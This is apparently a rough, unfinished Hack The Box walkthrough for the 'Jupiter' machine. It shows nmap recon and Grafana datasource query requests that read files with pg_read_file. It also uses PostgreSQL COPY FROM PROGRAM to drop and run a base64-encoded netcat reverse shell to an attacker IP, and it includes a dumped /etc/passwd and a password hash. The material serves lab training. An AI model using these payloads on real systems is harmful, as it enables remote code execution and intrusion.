# Introduction
<img width="684" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/30184ea8-6e74-4147-8627-a560a4492ada">

# Nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx jupiter.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- jupiter.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# user.txt

## HTTP (port 80)

we found a "Source" folder
we found a "sass" folder

sous domaine : kiosk.jupiter.htb
Grafana v9.5.2

http://kiosk.jupiter.htb/metrics

{db_name="grafana"}

http://kiosk.jupiter.htb/api/dashboards/uid/jMgFGfA4z
we found there is a user named admin

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select pg_read_file('/var/lib/grafana/grafana.db' , 0 , 1000000);","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":386}],"range":{"from":"2023-10-21T04:58:39.945Z","to":"2023-10-21T10:58:39.945Z","raw":{"from":"now-6h","to":"now"}},"from":"1697864319945","to":"1697885919945"}


SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=

/usr/share/grafana/README.md



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
juno:x:1000:1000:juno:/home/juno:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
grafana:x:115:121::/usr/share/grafana:/bin/false
jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution

DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table

echo cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMzkgNjY2NiA+L3RtcC9mCg== > /tmp/shell.sh


{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS exploit; CREATE TABLE exploit(cmd_output text); COPY exploit FROM PROGRAM 'echo cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMzkgNjY2NiA+L3RtcC9mCg== > /tmp/shell.sh'; SELECT * FROM exploit;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":656}],"range":{"from":"2023-10-24T12:33:59.955Z","to":"2023-10-24T18:33:59.955Z","raw":{"from":"now-6h","to":"now"}},"from":"1698150839955","to":"1698172439955"}

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS exploit; CREATE TABLE exploit(cmd_output text); COPY exploit FROM PROGRAM 'cat /tmp/shell.sh | base64 -d | bash &'; SELECT * FROM exploit;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":656}],"range":{"from":"2023-10-24T12:33:59.955Z","to":"2023-10-24T18:33:59.955Z","raw":{"from":"now-6h","to":"now"}},"from":"1698150839955","to":"1698172439955"}



{
        "tleroot":"/tmp/test",
        "updatePerdiod":1,
        "station": {     
                "id":1,
                "name":"hey"
        }
}
